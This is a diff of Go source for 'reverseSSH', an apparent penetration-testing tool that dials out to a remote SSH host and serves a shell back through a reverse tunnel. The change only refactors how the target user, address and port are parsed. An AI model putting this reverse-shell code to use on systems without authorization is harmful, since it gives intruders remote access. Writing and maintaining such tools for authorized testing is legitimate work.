@@ -34,7 +34,9 @@ import (
 )
 
 type params struct {
-	homeSshPort  uint
+	LUSER        string
+	LADDR        string
+	LPORT        uint
 	homeBindPort uint
 	shell        string
 	bindAddr     string
@@ -57,32 +59,18 @@ func SFTPHandler(s ssh.Session) {
 	}
 }
 
-func dialHomeAndServe(homeTarget string, homeBindPort uint, server ssh.Server) error {
+func dialHomeAndServe(user string, address string, homeBindPort uint, server ssh.Server) error {
 	var (
-		err         error
-		client      *gossh.Client
-		sshHomeUser string
-		sshHomeAddr string
+		err    error
+		client *gossh.Client
 	)
 
 	if homeBindPort > 0xffff || homeBindPort < 0 {
 		return fmt.Errorf("%d is not a valid port number", homeBindPort)
 	}
 
-	target := strings.Split(homeTarget, "@")
-	switch len(target) {
-	case 1:
-		sshHomeUser = "reverse"
-		sshHomeAddr = target[0]
-	case 2:
-		sshHomeUser = target[0]
-		sshHomeAddr = target[1]
-	default:
-		log.Fatalf("Could not parse '%s'", target)
-	}
-
 	config := &gossh.ClientConfig{
-		User: sshHomeUser,
+		User: user,
 		Auth: []gossh.AuthMethod{
 			gossh.Password(localPassword),
 		},
@@ -91,7 +79,7 @@ func dialHomeAndServe(homeTarget string, homeBindPort uint, server ssh.Server) e
 
 	// Attempt to connect with localPassword initially and keep asking for password on failure
 	for {
-		client, err = gossh.Dial("tcp", sshHomeAddr, config)
+		client, err = gossh.Dial("tcp", address, config)
 		if err == nil {
 			break
 		} else if strings.HasSuffix(err.Error(), "no supported methods remain") {
@@ -120,7 +108,7 @@ func dialHomeAndServe(homeTarget string, homeBindPort uint, server ssh.Server) e
 	return server.Serve(ln)
 }
 
-func setup(p *params) {
+func setupParameters() *params {
 	var help = fmt.Sprintf(`reverseSSH %[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 
 Usage: %[1]s [options] [<user>@]<target>
@@ -159,7 +147,9 @@ Credentials:
 		os.Exit(1)
 	}
 
-	flag.UintVar(&p.homeSshPort, "p", 22, "")
+	p := params{}
+
+	flag.UintVar(&p.LPORT, "p", 22, "")
 	flag.UintVar(&p.homeBindPort, "b", 8888, "")
 	flag.StringVar(&p.shell, "s", defaultShell, "")
 	flag.StringVar(&p.bindAddr, "l", ":31337", "")
@@ -169,6 +159,29 @@ Credentials:
 	if !p.verbose {
 		log.SetOutput(ioutil.Discard)
 	}
+
+	switch len(flag.Args()) {
+	case 0:
+		p.LADDR = ""
+	case 1:
+		target := strings.Split(fmt.Sprintf("%s:%d", flag.Args()[0], p.LPORT), "@")
+		switch len(target) {
+		case 1:
+			p.LUSER = "reverse"
+			p.LADDR = target[0]
+		case 2:
+			p.LUSER = target[0]
+			p.LADDR = target[1]
+		default:
+			log.Fatalf("Could not parse '%s'", target)
+		}
+
+	default:
+		log.Println("Invalid arguments, check usage!")
+		os.Exit(1)
+	}
+
+	return &p
 }
 
 func run(p *params, server ssh.Server) {
@@ -177,8 +190,8 @@ func run(p *params, server ssh.Server) {
 		log.Printf("Starting ssh server on %s", p.bindAddr)
 		log.Fatal(server.ListenAndServe())
 	case 1:
-		log.Printf("Dialling home via ssh to %s:%d", flag.Args()[0], p.homeSshPort)
-		log.Fatal(dialHomeAndServe(fmt.Sprintf("%s:%d", flag.Args()[0], p.homeSshPort), p.homeBindPort, server))
+		log.Printf("Dialling home via ssh to %s", p.LADDR)
+		log.Fatal(dialHomeAndServe(p.LUSER, p.LADDR, p.homeBindPort, server))
 	default:
 		log.Println("Invalid arguments, check usage!")
 		os.Exit(1)
